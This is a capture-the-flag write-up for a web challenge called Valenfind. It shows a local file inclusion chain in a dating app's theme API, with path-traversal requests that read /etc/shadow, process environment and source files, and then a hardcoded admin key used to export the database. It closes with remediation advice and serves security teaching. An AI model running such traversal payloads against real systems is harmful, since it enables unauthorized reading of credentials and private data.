# Valenfind

**Category:** Web Exploitation  
**Vulnerability:** Local File Inclusion (LFI) → Source Code Disclosure → Hardcoded API Key → Database Export  
**Difficulty:** Medium

---

## TL;DR

A dating web app exposes an LFI vulnerability through a `layout` parameter in a theme API. By chaining LFI reads across `/proc/self/environ`, a systemd service file, and the app's source code, we extract a hardcoded admin API key. That key unlocks a database export endpoint containing the flag.

---

## Reconnaissance

### Web Application

The app is a dating platform. After registering and completing a profile, users land on a dashboard where they can view and like other profiles.

![IMG 1](/challenges/screenshots/valenfind/image.png)

Key observations during recon:

- Liking a profile sends a `POST` request to `/like/<user-id>`
- Changing the profile theme triggers an API request with a `layout` parameter
- A profile named `cupid` exists with the description "i keep the database secure" — a hint toward the database being the target
![IMG 2](/challenges/screenshots/valenfind/image(1).png)

- The `/like/<user-id>` endpoint suggests sequential user IDs, a potential IDOR surface

### Discovering LFI

The theme API accepts a `layout` parameter. 

![IMG 3](/challenges/screenshots/valenfind/image(2).png)

Testing path traversal sequences:
To verify, we try a known static path:

```
GET /api/theme?layout=../static/avatars/default.jpg
```
![IMG 4](/challenges/screenshots/valenfind/image(4).png)


The server returns an error but attempts to access the file, confirming that path traversal sequences are processed.

### Confirming via Source Code Comment

Inspecting the HTML source of a profile page reveals a developer comment:

```html
<!-- Vulnerability: 'layout' parameter allows LFI -->
```
![IMG 5](/challenges/screenshots/valenfind/image(5).png)


The vulnerability is explicitly documented in the code.

---

## Exploitation

### Step 1: Read /etc/shadow

```
GET /api/theme?layout=../../../etc/shadow
```
![IMG 6](/challenges/screenshots/valenfind/image(6).png)

Most accounts are locked (`!` or `*`), so cracking hashes is not the intended path. This read confirms arbitrary file access.

### Step 2: Read /proc/self/environ

```
GET /api/theme?layout=../../../proc/self/environ
```
![IMG 7](/challenges/screenshots/valenfind/image(7).png)

Output reveals the running process belongs to a systemd unit: `valenfind.service`.

### Step 3: Read the Service File

```
GET /api/theme?layout=../../../etc/systemd/system/valenfind.service
```
![IMG 8](/challenges/screenshots/valenfind/image(8).png)


The `ExecStart` field exposes the full path to the application source code, for example:

```
ExecStart=/usr/bin/python3 /opt/valenfind/app.py
```

### Step 4: Read the Application Source Code

```
GET /api/theme?layout=../../../opt/valenfind/app.py
```
![IMG 9](/challenges/screenshots/valenfind/image(9).png)


Key findings from `app.py`:

- Database file: `cupid.db`
- Hardcoded admin key:
  ```python
  ADMIN_API_KEY = "CUPID_MASTER_KEY_2024_XOXO"
  ```
- Admin endpoint definition:
  ```
  GET /api/admin/export_db
  Required header: X-Valentine-Token: <ADMIN_API_KEY>
  ```

![IMG 10](/challenges/screenshots/valenfind/image(11).png)


### Step 5: Export the Database

```http
GET /api/admin/export_db HTTP/1.1
Host: <TARGET_IP>
X-Valentine-Token: CUPID_MASTER_KEY_2024_XOXO
```
![IMG 11](/challenges/screenshots/valenfind/image(12).png)

The endpoint returns the full database contents. Browse the output to find the flag.

![IMG 12](/challenges/screenshots/valenfind/image(13).png)

---

## Remediation

**1. Never use unsanitised user input to construct file paths**  
The `layout` parameter is passed directly to a file read function. Any user-controlled value used in file path construction must be validated against a strict allowlist of permitted values. Path traversal sequences (`../`) must be stripped or rejected.

**2. Remove hardcoded secrets from source code**  
The admin API key was hardcoded directly in `app.py`. Secrets must be stored in environment variables or a secrets manager and never committed to source files.

**3. Restrict file system access to the minimum required**  
The application process should run with the lowest privilege level necessary. A properly configured AppArmor or seccomp profile would prevent the process from reading arbitrary files like `/etc/shadow` or `/proc/self/environ`.

**4. Remove developer comments from production code**  
A comment explicitly naming the vulnerable parameter was left in the HTML output. Source code comments, debug notes, and TODO items must be stripped before deployment.

**5. Protect sensitive API endpoints with robust authentication**  
A single static API key with no rotation or expiry is not sufficient protection for an endpoint that exports the entire database. Endpoints of this sensitivity should require short-lived tokens, IP allowlisting, and rate limiting at minimum.

**6. Store the database outside the web root**  
If the database had not been accessible via LFI, the exploit chain would have stopped earlier. Application databases should be stored in locations the web process cannot read directly.

